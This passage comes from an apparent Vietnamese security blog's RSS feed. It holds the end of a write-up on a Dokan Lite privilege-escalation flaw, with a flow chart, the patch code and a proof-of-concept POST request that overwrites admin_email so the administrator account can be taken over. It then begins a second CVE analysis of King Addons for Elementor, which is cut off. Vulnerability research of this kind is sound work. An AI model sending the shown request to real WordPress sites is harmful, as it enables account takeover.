href=&#34;http://localhost:1313/posts/2026-01-04-cve-2025-53425/register.png&#34; title=&#34;Register&#34; data-thumbnail=&#34;/posts/2026-01-04-cve-2025-53425/register.png&#34; data-sub-html=&#34;&lt;h2&gt;Register&lt;/h2&gt;&lt;p&gt;Register&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-04-cve-2025-53425/register.png&#39; alt=&#34;Register&#34; height=&#34;1081&#34; width=&#34;1638&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Register&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Cơ chế này chỉ cho phép người dùng đăng ký với vai trò &lt;strong&gt;Customer&lt;/strong&gt; hoặc &lt;strong&gt;Vendor&lt;/strong&gt;, vì vậy &lt;strong&gt;không thể khai thác theo kịch bản thay đổi &lt;code&gt;default_role&lt;/code&gt; như trên&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Mặc dù vậy, kẻ tấn công vẫn có thể khai thác theo hướng khác. Cụ thể, bằng cách &lt;strong&gt;thay đổi option &lt;code&gt;admin_email&lt;/code&gt;&lt;/strong&gt;, attacker có thể:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Gán email quản trị về email do mình kiểm soát&lt;/li&gt;&#xA;&lt;li&gt;Sử dụng chức năng &lt;strong&gt;Forgot Password&lt;/strong&gt; để đặt lại mật khẩu&lt;/li&gt;&#xA;&lt;li&gt;Chiếm quyền truy cập tài khoản &lt;strong&gt;Administrator&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Ví dụ kiểm tra trong database:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from wp_options where option_name = &amp;#39;admin_email&amp;#39;;&#xA;&amp;#43;-----------&amp;#43;-------------&amp;#43;-----------------&amp;#43;----------&amp;#43;&#xA;| option_id | option_name | option_value    | autoload |&#xA;&amp;#43;-----------&amp;#43;-------------&amp;#43;-----------------&amp;#43;----------&amp;#43;&#xA;|         7 | admin_email | admin@gmail.com | on       |&#xA;&amp;#43;-----------&amp;#43;-------------&amp;#43;-----------------&amp;#43;----------&amp;#43;&#xA;1 row in set (0.001 sec)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cách khai thác này vẫn dẫn đến &lt;strong&gt;Privilege Escalation&lt;/strong&gt;, dù không tạo admin trực tiếp, mà thông qua &lt;strong&gt;chiếm quyền tài khoản quản trị hiện có&lt;/strong&gt;.&lt;/p&gt;&lt;/div&gt;&lt;hr&gt;&#xA;&lt;p&gt;Bản vá &lt;strong&gt;v4.1.3&lt;/strong&gt; đã bổ sung &lt;strong&gt;kiểm tra và giới hạn &lt;code&gt;option_name&lt;/code&gt;&lt;/strong&gt;, chỉ cho phép cập nhật các option &lt;strong&gt;nằm trong danh sách section hợp lệ&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// validate and sanitize option name to avoid any unwanted option update&#xA;if ( ! in_array( $option_name, wp_list_pluck( $this-&amp;gt;get_settings_sections(), &amp;#39;id&amp;#39; ), true ) ) {&#xA;    throw new DokanException( &amp;#39;dokan_settings_invalid_section&amp;#39;, __( &amp;#39;Invalid section name.&amp;#39;, &amp;#39;dokan-lite&amp;#39; ), 400 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nhờ đó, người dùng &lt;strong&gt;không thể tùy ý chỉ định option name&lt;/strong&gt;, ngăn chặn việc ghi đè các option nhạy cảm như &lt;code&gt;admin_email&lt;/code&gt;, và &lt;strong&gt;khắc phục lỗ hổng Privilege Escalation&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Shop Manager (Authenticated User)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Click Save Settings (Dokan Admin UI)&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;POST /wp-admin/admin-ajax.php&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;action=dokan_save_settings&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;wp_ajax_dokan_save_settings&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Settings::save_settings_value()&amp;#34;]&#xA;&#xA;F --&amp;gt; G{&amp;#34;current_user_can(&amp;#39;manage_woocommerce&amp;#39;)?&amp;#34;}&#xA;G -- No --&amp;gt; H[&amp;#34;Abort&amp;#34;]&#xA;G -- Yes --&amp;gt; I{&amp;#34;Nonce dokan_admin valid?&amp;#34;}&#xA;&#xA;I -- No --&amp;gt; J[&amp;#34;Abort&amp;#34;]&#xA;I -- Yes --&amp;gt; K[&amp;#34;Read POST parameters&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;section taken as option_name&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;settingsData taken as option_value&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;update_option(option_name, option_value)&amp;#34;]&#xA;N --&amp;gt; O[&amp;#34;Sensitive wp_options modified&amp;#34;]&#xA;&#xA;O --&amp;gt; P[&amp;#34;Change admin_email&amp;#34;]&#xA;P --&amp;gt; Q[&amp;#34;Use Forgot Password&amp;#34;]&#xA;Q --&amp;gt; R[&amp;#34;Take over Administrator account&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Truy cập endpoint &lt;code&gt;http://localhost/wp-admin/admin.php?page=dokan#/settings&lt;/code&gt; và click &lt;code&gt;Save Changes&lt;/code&gt; button&lt;/li&gt;&#xA;&lt;li&gt;Cho request đi qua Burp Proxy&lt;/li&gt;&#xA;&lt;li&gt;Gửi lại request với params &lt;code&gt;section=admin_email&lt;/code&gt; và &lt;code&gt;settingsData=attacker@gmail.com&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: shop_manager_cookie&#xA;&#xA;action=dokan_save_settings&amp;amp;nonce=d7311ec197&amp;amp;settingsData=attacker@gmail.com&amp;amp;section=admin_email&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-04-cve-2025-53425/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2026-01-04-cve-2025-53425/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-04-cve-2025-53425/result.png&#39; alt=&#34;Result&#34; height=&#34;745&#34; width=&#34;1612&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng trong &lt;strong&gt;Dokan Lite ≤ 4.1.3&lt;/strong&gt; xảy ra do &lt;strong&gt;kiểm soát quyền không chặt chẽ&lt;/strong&gt;. Việc chỉ kiểm tra &lt;code&gt;manage_woocommerce&lt;/code&gt; cho phép &lt;strong&gt;Shop Manager&lt;/strong&gt; thực thi chức năng lưu settings và ghi đè &lt;strong&gt;bất kỳ option nào&lt;/strong&gt; thông qua &lt;code&gt;update_option()&lt;/code&gt;, dẫn đến &lt;strong&gt;Privilege Escalation&lt;/strong&gt; (ví dụ chiếm quyền Administrator qua &lt;code&gt;admin_email&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;manage_woocommerce&lt;/code&gt; là quyền &lt;strong&gt;quá rộng&lt;/strong&gt; cho thao tác toàn cục.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Shop Manager không nên có quyền thay đổi system options&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;update_option()&lt;/code&gt; phải đi kèm &lt;strong&gt;whitelist option&lt;/strong&gt; hoặc &lt;strong&gt;giới hạn role Administrator&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/dokan-lite/vulnerability/wordpress-dokan-plugin-4-0-8-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Dokan Plugin &amp;lt;= 4.1.3 is vulnerable to a medium priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-6325 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-03-cve-2025-6325/</link>
      <pubDate>Sat, 03 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-03-cve-2025-6325/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Lỗ hổng phân quyền không chính xác (Incorrect Privilege Assignment)&lt;/strong&gt; trong plugin &lt;strong&gt;King Addons for Elementor&lt;/strong&gt; của &lt;strong&gt;KingAddons.com&lt;/strong&gt; cho phép &lt;strong&gt;leo thang đặc quyền (Privilege Escalation)&lt;/strong&gt;.&#xA;Lỗ hổng này ảnh hưởng đến &lt;strong&gt;King Addons for Elementor&lt;/strong&gt; từ &lt;strong&gt;không xác định (n/a)&lt;/strong&gt; đến &lt;strong&gt;phiên bản 51.1.36 trở xuống (&amp;lt;= 51.1.36)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-6325&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-6325&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 51.1.36&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 51.1.37&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/king-addons/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress King Addons for Elementor Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;King Addons for Elementor&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;51.1.14&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;51.1.37&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Elementor Plugin&lt;/strong&gt; → &lt;a href=&#34;https://wordpress.org/plugins/elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Elementor&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Thông tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;ul&gt;&#xA;&lt;li&gt;Như cái tên &lt;strong&gt;King Addons for Elementor&lt;/strong&gt;, plugin cần &lt;strong&gt;Elementor&lt;/strong&gt; để hoạt động. Plugin này cung cấp nhiều widget và tính năng mở rộng cho &lt;strong&gt;Elementor&lt;/strong&gt; nhằm hỗ trợ xây dựng giao diện website.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/widget.png&#34; title=&#34;Các widget của King Addons for Elementor&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/widget.png&#34; data-sub-html=&#34;&lt;h2&gt;Widget&lt;/h2&gt;&lt;p&gt;Các widget của King Addons for Elementor&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/widget.png&#39; alt=&#34;Widget&#34; height=&#34;994&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Các widget của King Addons for Elementor&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/li&gt;&#xA;&lt;li&gt;Lỗ hổng được ghi nhận ảnh hưởng từ &lt;strong&gt;không xác định (n/a)&lt;/strong&gt; đến &lt;strong&gt;phiên bản &lt;code&gt;51.1.36&lt;/code&gt; trở xuống&lt;/strong&gt;, tuy nhiên &lt;strong&gt;trên thực tế lỗ hổng này đã được vá ở một số phiên bản nằm trong phạm vi được công bố&lt;/strong&gt;, do đó không phải tất cả các phiên bản được liệt kê đều còn tồn tại vấn đề bảo mật này.&lt;/li&gt;&#xA;&lt;/ul&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Khi thực hiện diff code giữa phiên bản được công bố là ảnh hưởng gần nhất (&lt;code&gt;v51.1.36&lt;/code&gt;) và bản vá (&lt;code&gt;v51.1.37&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/diff1.png&#34; title=&#34;Diff code 1&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/diff1.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff1&lt;/h2&gt;&lt;p&gt;Diff code 1&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/diff1.png&#39; alt=&#34;Diff1&#34; height=&#34;465&#34; width=&#34;1837&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Diff code 1&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/diff2.png&#34; title=&#34;Diff code 2&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/diff2.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff2&lt;/h2&gt;&lt;p&gt;Diff code 2&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/diff2.png&#39; alt=&#34;Diff2&#34; height=&#34;250&#34; width=&#34;1875&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Diff code 2&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Quan sát sự thay đổi của các file trên, tôi không thấy có sự thay đổi nào liên quan đến lỗ hổng &lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Thực hiện search sink với phiên bản &lt;code&gt;v51.1.36&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/sink.png&#34; title=&#34;Search sink v51.1.36&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/sink.png&#34; data-sub-html=&#34;&lt;h2&gt;Sink&lt;/h2&gt;&lt;p&gt;Search sink v51.1.36&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/sink.png&#39; alt=&#34;Sink&#34; height=&#34;761&#34; 